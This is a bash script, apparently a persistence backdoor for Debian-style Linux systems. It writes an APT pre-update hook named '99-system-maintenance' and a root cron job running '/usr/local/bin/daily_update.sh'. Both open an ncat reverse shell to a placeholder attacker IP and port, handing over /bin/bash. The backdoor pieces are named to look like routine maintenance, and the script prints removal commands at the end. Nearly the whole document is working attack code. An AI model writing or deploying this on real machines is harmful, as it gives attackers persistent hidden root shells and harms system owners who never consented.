#!/bin/bash

# Set the attacker's IP and port manually within the script
ATTACKER_IP="attacker_ip_here"
ATTACKER_PORT="attacker_port_here"

# Create an APT configuration file for the update hook
cat << EOF > /etc/apt/apt.conf.d/99-system-maintenance
# Reverse shell backdoor - replace 'attacker_ip_here' and 'attacker_port_here' with actual values
APT::Update::Pre-Invoke {"nohup ncat $ATTACKER_IP $ATTACKER_PORT -e /bin/bash 2> /dev/null &"};
EOF

# Create a script that will be executed by cron
cat << EOF > /usr/local/bin/daily_update.sh
#!/bin/bash

# Persistent reverse shell backdoor
ATTACKER_IP="$ATTACKER_IP"
ATTACKER_PORT="$ATTACKER_PORT"

# Execute the reverse shell
nohup ncat \$ATTACKER_IP \$ATTACKER_PORT -e /bin/bash 2> /dev/null &
EOF

# Make the script executable
chmod +x /usr/local/bin/daily_update.sh

# Create a cron job to run the script daily
cat << EOF > /etc/cron.d/daily_update

# Run the daily_update.sh script daily at midnight
0 0 * * * root /usr/local/bin/daily_update.sh
EOF

# Provide instructions for removal
echo "To remove the APT hook, use: rm -f /etc/apt/apt.conf.d/99-system-maintenance"
echo "To remove the cron job, use: rm -f /etc/cron.d/daily_update"
